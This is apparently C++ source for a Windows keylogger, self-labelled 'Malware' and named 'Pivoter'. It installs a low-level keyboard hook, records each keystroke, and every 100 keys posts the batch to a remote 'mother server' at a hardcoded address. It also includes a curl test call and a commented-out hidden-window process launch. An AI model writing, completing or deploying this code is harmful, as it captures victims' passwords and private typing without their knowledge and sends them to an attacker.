/*
	Project name: Pivoter
	Project 1-Word Description: Malware
	Author: Kevin Jerebica ( Osamu-KJ )
*/

#include <iostream>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include <vector>
#include "codes.h"
#include "connections_pivoter.h"

#define DEBUG FALSE
#define KEYS_LIMIT 100
HHOOK keyboard_events_hook; 
std::vector<std::string> virt_codes; 
ConnectionsPivoter mother_server_pv = ConnectionsPivoter("http://192.168.1.108:443/client-fetch-keys"); 

void stack_codes() {
	if (virt_codes.size() < KEYS_LIMIT)
		return; 
	
	// send the codes to the mother server 
	if (mother_server_pv.send_codes(virt_codes))
		std::cout << "the transfer was successful.." << std::endl;
	else
		std::cout << "the transfer failed.." << std::endl; 
	
	virt_codes.clear();
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
		DWORD virt_code = kbd_struct->vkCode; 

		std::string string_key_code = VIRTUAL_KEY_CODE_TABLE[virt_code].name; 
		if (DEBUG) {
			std::cout << "Key pressed: " << string_key_code << std::endl; 
			std::cout << "Len of the vector: " << virt_codes.size() << std::endl; 
		}

		virt_codes.push_back(string_key_code);
		stack_codes();
	}
	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
}

void test_function() {
	CURL* curl;
	CURLcode res;

	/* In windows, this will init the winsock stuff */
	curl_global_init(CURL_GLOBAL_ALL);

	/* get a curl handle */
	curl = curl_easy_init();
	if (curl) {
		/* First set the URL that is about to receive our POST. This URL can
		   just as well be an https:// URL if that is what should receive the
		   data. */
		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.108:443/test");
		/* Now specify the POST data */
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));

		/* always cleanup */
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}

int main() {
	
	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 

	STARTUPINFOA startup_info; 
	PROCESS_INFORMATION process_info; 

	memset(&startup_info, 0, sizeof(STARTUPINFOA)); 
	memset(&process_info, 0, sizeof(PROCESS_INFORMATION)); 
	startup_info.cb = sizeof(startup_info); 
 
	/*BOOL test = CreateProcessA(
		NULL,
		(LPSTR) "curl http://192.168.1.108",
		NULL, 
		NULL, 
		false, 
		CREATE_NO_WINDOW,
		NULL, 
		NULL,
		&startup_info,
		&process_info);
	if (test == FALSE) {
		std::cout << "problem!" << std::endl; 
	}*/
	
	// EVENT LOOP
	while (GetMessage(NULL, NULL, 0, 0)); 

	UnhookWindowsHookEx(keyboard_events_hook);

	return 0; 
}
